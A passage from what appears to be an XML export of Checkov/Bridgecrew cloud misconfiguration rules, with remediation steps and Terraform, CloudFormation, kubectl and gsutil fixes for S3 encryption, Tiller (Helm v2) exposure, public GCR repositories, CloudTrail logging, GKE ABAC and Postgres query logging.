<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/s3/" target="_self">Amazon S3 console</a>.</li>
<li>Select the name of the bucket that you want from the <em>Bucket name list</em>.</li>
<li>Select <strong>Properties</strong>.</li>
<li>Select <strong>Default encryption</strong>.</li>
<li>To use keys that are managed by Amazon S3 for default encryption, select <strong>AES-256</strong>, then select <strong>Save</strong>.</li>
<li>If you want to use CMKs that are stored in AWS KMS for default encryption, follow these steps:<ol>
<li>Select <strong>AWS-KMS</strong>.</li>
<li>Select a customer-managed AWS KMS CMK that you have created, using one of these methods:<br/>
a) In the list that appears, select the <strong>AWS KMS CMK</strong>.<br/>
b) In the list that appears, select <strong>Custom KMS ARN</strong>, and then enter the <strong>Amazon Resource Name of the AWS KMS CMK</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol></li>
</ol>
<p>The steps above will encrypt all new files going forward. To encrypt all existing files, follow the steps below. Note that this will appear as an object modification, which will be logged if access logging is configured, and will count as a bucket write operation for billing purposes. Be mindful of applying these steps on large buckets.</p>
<ol>
<li>Navigate to the bucket <strong>Overview</strong> tab.</li>
<li>Select objects to encrypt.</li>
<li>From the <strong>Actions</strong> dropdown, select <strong>Change encryption</strong>.</li>
<li>Select the desired encryption method, then click <strong>Save</strong>.</li>
<li>The progress bar for the background job displays at the bottom of the screen.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set encryption at the bucket level for all new objects, use the following command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws s3api put-bucket-encryption 
--bucket awsexamplebucket 
--server-side-encryption-configuration 
'{"Rules": [{"ApplyServerSideEncryptionByDefault": {"SSEAlgorithm": "AES256"}}]}'
</code></pre></div></div>
<p>The command above will not encrypt existing objects. To do so, you must re-add each file with encryption. You can copy a single object back to itself encrypted with SSE-S3 (server-side encryption with Amazon S3-managed keys), using the following S3 Encrypt command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws s3 cp s3://awsexamplebucket/myfile s3://awsexamplebucket/myfile --sse AES256
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket</li>
<li><strong>Argument:</strong> server_side_encryption_configuration</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_s3_bucket" "example" {
  ...
+ server_side_encryption_configuration {
+   rule {
+       apply_server_side_encryption_by_default {
+       sse_algorithm = "AES256"
+       }
+   }
+   }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::S3::Bucket</li>
<li><strong>Argument:</strong> Properites.BucketEncryption</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::S3::Bucket
    Properties:
        ...
+       BucketEncryption:
+           ServerSideEncryptionConfiguration:
+               - ServerSideEncryptionByDefault:
+                   SSEAlgorithm: AES256
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/s3_14-data-encrypted-at-rest' target='_blank'> https://docs.bridgecrew.io/docs/s3_14-data-encrypted-at-rest</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/s3_14-data-encrypted-at-rest' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_45</key>
    <name>Ensure Tiller (Helm V2) deployment is not accessible from within the cluster</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="tiller-helm-v2-deployment-is-accessible-from-within-the-cluster"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-tiller-helm-v-2-deployment-is-accessible-from-within-the-cluster"></div>Tiller (Helm V2) deployment is accessible from within the cluster</div><a aria-label="Skip link to Tiller (Helm V2) deployment is accessible from within the cluster" class="heading-anchor-icon fa fa-anchor" href="#tiller-helm-v2-deployment-is-accessible-from-within-the-cluster"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Tiller (Helm v2) is the in-cluster component of Helm. It interacts directly with the Kubernetes API server to install, upgrade, query, and remove Kubernetes resources. It also stores the objects that represent releases. Its permissive configuration could grant the users a broad range of permissions.</p>
<p>Helm v3 removes Tiller, and it is recommended that you upgrade: see <a href="/docs/bc_k8s_32" target="_self">Ensure Tiller (Helm V2) Is Not Deployed</a>. However, this is not always feasible.</p>
<p>Restricting access to Tiller from within the cluster limits the abilities of a compromised pod or anonymous user in the cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-commands"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-commands"></div>CLI Commands</div><a aria-label="Skip link to CLI Commands" class="heading-anchor-icon fa fa-anchor" href="#cli-commands"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">kubectl -n kube-system patch deployment tiller-deploy --patch '
spec:
  template:
    spec:
      containers:
        - name: tiller
          ports: []
          args: ["--listen=localhost:44134"]
'
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: apps/v1
kind: Deployment
metadata:
  name: tiller
  labels:
    app: tiller
spec:
  progressDeadlineSeconds: 600
  replicas: 1
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      app: helm
      name: tiller
  template:
    metadata:
      creationTimestamp: null
      labels:
        app: helm
        name: tiller
    spec:
      automountServiceAccountToken: true
      containers:
+     - args:
+       - --listen=localhost:44134
        env:
        - name: TILLER_NAMESPACE
          value: kube-system
        - name: TILLER_HISTORY_MAX
          value: "0"
        image: gcr.io/kubernetes-helm/tiller:v2.16.9
        name: tiller
-       ports:
-       - containerPort: 44134
-         name: tiller
-         protocol: TCP
-       - containerPort: 44135
-         name: http
-         protocol: TCP
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_40' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_40</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_40' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_44</key>
    <name>Ensure Tiller (Helm v2) service is deleted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="tiller-helm-v2-service-is-not-deleted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-tiller-helm-v-2-service-is-not-deleted"></div>Tiller (Helm v2) service is not deleted</div><a aria-label="Skip link to Tiller (Helm v2) service is not deleted" class="heading-anchor-icon fa fa-anchor" href="#tiller-helm-v2-service-is-not-deleted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Tiller (Helm v2) is the in-cluster component of Helm. It interacts directly with the Kubernetes API server to install, upgrade, query, and remove Kubernetes resources. It also stores the objects that represent releases. Its permissive configuration could grant the users a broad range of permissions.</p>
<p>Helm v3 removes Tiller, and it is recommended that you upgrade: see <a href="/docs/bc_k8s_32" target="_self">Ensure Tiller (Helm V2) Is Not Deployed</a>. However, this is not always feasible.</p>
<p>Restricting access to Tiller from within the cluster limits the abilities of a compromised pod or anonymous user in the cluster.</p>
<p>After <a href="/docs/bc_k8s_40" target="_self">restricting connectivity to the Tiller deployment</a>, the Tiller service can be deleted.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-commands"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-commands"></div>CLI Commands</div><a aria-label="Skip link to CLI Commands" class="heading-anchor-icon fa fa-anchor" href="#cli-commands"></a></h2>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">kubectl -n kube-system delete service tiller-deploy</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Service</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">-- apiVersion: v1
-  kind: Service
-  metadata:
-    labels:
-      app: helm
-      name: tiller
-    name: tiller-deploy
-    namespace: kube-system
-  spec:
-    ports:
-    - name: tiller
-      port: 44134
-      protocol: TCP
-      targetPort: tiller
-    selector:
-      app: helm
-      name: tiller
-    type: ClusterIP
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_41' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_41</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_41' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_1</key>
    <name>Ensure Stackdriver logging on Kubernetes engine clusters is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="stackdriver-logging-on-kubernetes-engine-clusters-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-stackdriver-logging-on-kubernetes-engine-clusters-is-disabled"></div>Stackdriver logging on Kubernetes engine clusters is disabled</div><a aria-label="Skip link to Stackdriver logging on Kubernetes engine clusters is disabled" class="heading-anchor-icon fa fa-anchor" href="#stackdriver-logging-on-kubernetes-engine-clusters-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Stackdriver is the default logging solution for clusters deployed on GKE. Stackdriver logging is deployed to a new cluster by default, explicitly set to <strong>opt-out</strong>. Stackdriver logging collects only the container&#8217;s standard output and standard error streams. To ingest logs, Stackdriver logging agent must be deployed to each node in the cluster. Stackdriver provides a single-pane-of-glass view of metrics, logs, and traces through Kubernetes Engine clusters and workloads. </p>
<p>We recommend you use Stackdriver logging as a unified data logging solution for GKE workloads unless additional observability tooling is already in place.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_9</key>
    <name>Ensure GCP Container Registry repositories are not anonymously or publicly accessible</name>
    <description>
      <![CDATA[<p>GCP Container Registry repositories are anonymously or publicly accessible</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><em>Google Container Registry (GCR)</em> is a GCP service that contains repositories for your container images. A GCR repo is publicly accessible if the host location's underlying storage bucket is publicly accessible because GCR images are stored in GCS. Public GCR repositories can put your data at risk of exposure and should be adjusted to a more secure configuration (private).</p>
<p>We recommend you ensure that neither anonymous or public access to <strong>GCR Repositories</strong> is allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To remove anonymous or public access to your GCR repositories:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/gcr/settings" target="_self">GCR Settings</a>.</li>
<li>Under <em>Public access</em> locate the repositories that say <strong>PUBLIC</strong> under the <em>Visibility</em> column.</li>
<li>Select the dropdown and switch to <strong>PRIVATE</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To remove anonymous or public access to your GCR repositories use the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gsutil</code> command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gsutil iam ch -d PRINCIPAL gs://BUCKET-NAME
</code></pre></div></div>
<p>Replace <strong>PRINCIPAL</strong> with either <em>allUsers</em> or <em>allAuthenticatedUsers</em> depending on your Checkov alert. Replace <strong>BUCKET-NAME</strong> with the GCS bucket where your images are stored.</p>
<p>The <strong>BUCKET-NAME</strong> can be determined by executing <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gsutil ls</code> and your Container Registry bucket URL will be listed as <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gs://artifacts.PROJECT-ID.appspot.com</code> or <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gs://STORAGE-REGION.artifacts.PROJECT-ID.appspot.com</code>. <strong>PROJECT-ID</strong> and <strong>STORAGE-REGION</strong> will be replaced with your GCP project ID or the region where your GCR repository is configured.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_storage_bucket_iam_binding</p>
</li>
<li>
<p><strong>Field</strong>: members</p>
</li>
<li>
<p><strong>Resource</strong>: google_storage_bucket_iam_member</p>
</li>
<li>
<p><strong>Field</strong>: member</p>
</li>
</ul>
<p>Google Container Registry (GCR) does not have IAM-specific resources in Terraform. Instead, GCR IAM is handled via GCS IAM resources as seen in the below examples.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_storage_bucket_iam_binding" "gcr_public_binding" {
  bucket = google_storage_bucket.default.name
  role = "roles/storage.viewer"

  members = [
-    "allUsers",
-    "allAuthenticatedUsers",
  ]
}
</code></pre></div></div>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_artifact_registry_repository_iam_member" "public_member" {
  provider = google-beta
  location = google_artifact_registry_repository.my-repo.location
  repository = google_artifact_registry_repository.my-repo.name
  role = "roles/artifactregistry.writer"

-  member = "allUsers"
-  member = "allAuthenticatedUsers"
}
</code></pre></div></div>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_storage_bucket_iam_member" "gcr_public_member" {
  bucket = google_storage_bucket.default.name
  role = "roles/storage.viewer"

-  member = "allUsers"
-  member = "allAuthenticatedUsers"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-google-container-registry-repository-is-not-anonymously-or-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-google-container-registry-repository-is-not-anonymously-or-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-google-container-registry-repository-is-not-anonymously-or-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_10</key>
    <name>Ensure CloudTrail trail is integrated with CloudWatch Log</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudtrail-trail-is-not-integrated-with-cloudwatch-log"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-trail-trail-is-not-integrated-with-cloud-watch-log"></div>CloudTrail trail is not integrated with CloudWatch Log</div><a aria-label="Skip link to CloudTrail trail is not integrated with CloudWatch Log" class="heading-anchor-icon fa fa-anchor" href="#cloudtrail-trail-is-not-integrated-with-cloudwatch-log"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS CloudTrail is a web service that records AWS API calls made in a given AWS account. The recorded information includes the identity of the API caller, the time of the API call, the source IP address of the API caller, the request parameters, and the response elements returned by the AWS service. CloudTrail uses Amazon S3 for log file storage and delivery, so log files are stored durably. In addition to capturing CloudTrail logs within a specified S3 bucket for long term analysis, realtime analysis can be performed by configuring CloudTrail to send logs to CloudWatch logs. For a trail that is enabled in all regions in an account, CloudTrail sends log files from all those regions to a CloudWatch logs log group. It is recommended that CloudTrail logs be sent to CloudWatch logs.</p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>The intent of this recommendation is to ensure AWS account activity is being captured, monitored, and appropriately alarmed on. CloudWatch logs is a native way to accomplish this using AWS services but does not preclude the use of an alternate solution.</p></blockquote>
<p>Sending CloudTrail logs to CloudWatch logs will facilitate real-time and historic activity logging based on user, API, resource, and IP address, and provides opportunity to establish alarms and notifications for anomalous or sensitivity account activity.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_cloudtrail</li>
<li><strong>Argument:</strong> cloud_watch_logs_group_arn</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudtrail" "aws_cloudtrail_ok" {
  name                          = "tf-trail-foobar"
  cloud_watch_logs_group_arn = "${aws_cloudwatch_log_group.example.arn}:*"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-cloudtrail-trails-are-integrated-with-cloudwatch-logs' target='_blank'> https://docs.bridgecrew.io/docs/ensure-cloudtrail-trails-are-integrated-with-cloudwatch-logs</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-cloudtrail-trails-are-integrated-with-cloudwatch-logs' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_7</key>
    <name>Ensure ABAC authorization on Kubernetes engine clusters is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="abac-authorization-on-kubernetes-engine-clusters-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-abac-authorization-on-kubernetes-engine-clusters-is-enabled"></div>ABAC authorization on Kubernetes engine clusters is enabled</div><a aria-label="Skip link to ABAC authorization on Kubernetes engine clusters is enabled" class="heading-anchor-icon fa fa-anchor" href="#abac-authorization-on-kubernetes-engine-clusters-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Kubernetes RBAC (Role-Based Access Control) can be used to grant permissions to resources at the cluster and namespace level. It allows defining roles with rules containing a set of permissions. RBAC has significant security advantages and is now stable in Kubernetes, superseding  the benefits of legacy authorization with ABAC (Attribute-Based Access Control). </p>
<p>We recommend you disable ABAC authorization and use RBAC in GKE instead.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_30</key>
    <name>Ensure Postgres RDS has Query Logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ensure-postgres-rds-as-aws_db_instance-has-query-logging-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ensure-postgres-rds-as-aws-db-instance-has-query-logging-enabled"></div>Ensure Postgres RDS as aws_db_instance has Query Logging enabled</div><a aria-label="Skip link to Ensure Postgres RDS as aws_db_instance has Query Logging enabled" class="heading-anchor-icon fa fa-anchor" href="#ensure-postgres-rds-as-aws_db_instance-has-query-logging-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This check ensures that you have enabled query logging set up for your PostgreSQL database instance. An instance needs to have a non-default parameter group and two parameters set - that of <em>log_statement</em> and <em>log_min_duration_statement</em>, these need to be set to <em>all</em> and <em>1</em> respectively to get sufficient logs.</p>
<p> <em>Note</em><br/>
Setting querying logging can expose secrets (including passwords) from your queries, - restrict and encrypt to mitigate. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime-remediation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-remediation"></div>Fix - Buildtime Remediation</div><a aria-label="Skip link to Fix - Buildtime Remediation" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime-remediation"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>You will need to have a resource aws_db_instance that refers to your aws_db_parameter_group attribute: parameter_group_name. With that in place the following parameters need to be set: </p>
